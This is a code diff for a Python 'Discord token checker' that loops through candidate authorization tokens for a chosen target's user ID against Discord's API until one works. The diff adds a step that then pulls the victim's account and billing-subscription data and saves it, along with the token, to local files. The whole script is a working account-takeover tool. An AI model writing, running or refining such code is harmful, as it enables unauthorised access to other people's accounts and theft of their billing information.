@@ -18,7 +18,7 @@ def main() -> None:
         if name == "nt":
             system("title DISCORD TOKEN CHECKER - Made by Venu2HD#1761")
         SETTINGS: dict = get_config()
-        START_BASE64, TARGET_UUID = get_target_BASE64(clear_screen)
+        START_BASE64, TARGET_UUID = get_target(clear_screen)
         clear_screen()
         while True:
             full: str = f"{START_BASE64}.{'{}'}".format(
@@ -26,20 +26,27 @@ def main() -> None:
             )
             with Session() as session:
                 response = session.get(
-                    "http://discord.com/api/v9/users/@me/billing/payment-sources",
+                    "http://discord.com/api/v9/users/@me",
                     headers={"authorization": full},
                 )
                 if response.status_code == 200:
-                    write_result(TARGET_UUID, full)
+                    billing_response = session.get(
+                        "http://discordapp.com/api/v6/users/@me/billing/subscriptions",
+                        headers={"authorization": full},
+                    )
+                    write_result(
+                        TARGET_UUID, response.json(), billing_response.json(), full
+                    )
                     clear_screen()
                     if name == "nt":
                         input(
-                            f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}\\results\\{TARGET_UUID}.txt{Fore.WHITE}\n"
+                            f"{Fore.GREEN}TOKEN FOUND!\nResults written to:\n{getcwd()}\\{TARGET_UUID}.txt,\n{getcwd()}\\{TARGET_UUID}.json\n{Fore.WHITE}"
                         )
                     else:
                         input(
-                            f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}/results/{TARGET_UUID}.txt{Fore.WHITE}.txt\n"
+                            f"{Fore.GREEN}TOKEN FOUND!\nResults written to:\n{getcwd()}\\{TARGET_UUID}.txt,\n{getcwd()}/{TARGET_UUID}.json\n{Fore.WHITE}"
                         )
+                    clear_screen()
                     exit()
                 elif response.status_code == 401:
                     print(f"{Fore.RED}TESTED: {full}{Fore.WHITE}")
@@ -55,5 +62,3 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-
-
